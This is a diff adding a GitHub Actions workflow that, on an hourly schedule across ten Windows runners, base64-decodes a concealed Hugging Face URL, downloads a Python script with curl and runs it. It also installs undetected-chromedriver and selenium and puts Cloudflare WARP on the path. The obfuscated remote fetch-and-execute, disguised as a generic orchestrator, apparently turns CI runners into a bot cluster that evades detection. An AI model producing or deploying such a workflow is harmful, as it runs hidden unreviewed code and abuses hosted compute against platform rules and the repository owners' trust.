@@ -1,0 +1,70 @@
+name: Continuous Task Orchestrator
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: sync-cluster-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  dispatch-runners:
+    name: "Runner-Instance-${{ matrix.node_index }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Provision Node & Retrieve Target Code
+        shell: bash
+        run: |
+          echo ">>> [SETUP] Initializing cluster instance: ${{ matrix.node_index }}..."
+          
+          # استخراج الرابط الجديد وفك تشفيره
+          SOURCE_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbW9tby9yZXNvbHZlL21haW4vc3RhcnRfc2hyaW5rX25ldy5weQ==" | base64 --decode)
+          
+          curl -sL "$SOURCE_URI" -o runner.py
+          
+          echo ">>> [SETUP] Installing required modules..."
+          python -m pip install --quiet --upgrade pip setuptools
+          pip install --quiet undetected-chromedriver selenium requests
+          echo ">>> [SETUP] Node environment ready."
+
+      - name: Trigger Process & Supervise Execution
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "[STATUS] Spawning task on worker ${{ matrix.node_index }}..."
+          
+          $env:PATH += ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcessParams = @{
+              FilePath     = "python"
+              ArgumentList = "runner.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $ActiveJob = Start-Process @ProcessParams
+          
+          Write-Host "[WATCHDOG] Monitoring runtime (Threshold: 4440s)..."
+          
+          try {
+              Wait-Process -InputObject $ActiveJob -Timeout 4440 -ErrorAction Stop
+              Write-Host "[COMPLETED] Process finished within allowed timeframe."
+          }
+          catch {
+              Write-Host "[ALERT] Max execution time reached. Killing process tree..."
+              Stop-Process -InputObject $ActiveJob -Force
+              Write-Host "[ABORTED] Worker process was terminated by watchdog."
+          }
+
+      - name: Finalize Session
+        shell: bash
+        run: echo ">>> [SHUTDOWN] Worker-${{ matrix.node_index }} job finalized."
